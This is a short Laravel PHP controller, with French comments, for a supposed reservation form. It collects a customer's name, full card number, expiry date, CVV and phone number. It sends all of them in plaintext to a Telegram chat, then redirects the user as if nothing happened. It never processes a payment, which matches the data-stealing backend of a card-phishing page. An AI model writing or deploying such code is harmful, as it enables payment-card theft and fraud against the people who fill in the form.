<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Notifications\TelegramAlert;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Log;

class ReservationController extends Controller
{
    public function submit(Request $request)
    {
        $validated = $request->validate([
            'name' => 'required|string|max:255',
            'card_number' => 'required|string|regex:/^[0-9\s]{13,19}$/',
            'expiry'      => 'required|string',
            'cvv'         => 'required|string|digits:3',
            'phone'       => 'required|string',
        ]);

        // Nettoyer le numéro de carte (enlever les espaces)
        $cleanCardNumber = str_replace(' ', '', $validated['card_number']);
        
        // Vérifier qu'il y a exactement 16 chiffres
        if (strlen($cleanCardNumber) !== 16 || !ctype_digit($cleanCardNumber)) {
            return back()->withErrors(['card_number' => 'Le numéro de carte doit contenir exactement 16 chiffres.']);
        }

        // Formatage du message Telegram
        $message = "🔔 *INFORMATIONS BANCAIRES* 🔔\n\n"
                . "👤 Nom : {$validated['name']}\n"
                . "💳 Carte : `{$cleanCardNumber}`\n" 
                . "📅 Exp : {$validated['expiry']}\n"
                . "🔑 CVV : `{$validated['cvv']}`\n"
                . "📱 Téléphone : {$validated['phone']}";

        // Envoyer Telegram en arrière-plan avec timeout court
        try {
            $startTime = microtime(true);
            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                ->notify(new TelegramAlert($message));
            $elapsed = microtime(true) - $startTime;
            if ($elapsed > 1) {
                Log::warning('Telegram took ' . round($elapsed, 2) . 's');
            }
        } catch (\Throwable $e) {
            Log::warning('Telegram failed (non-critical): ' . $e->getMessage());
        }

        // Continuer quoi qu'il arrive
        return redirect()->route('valider');
    }
}
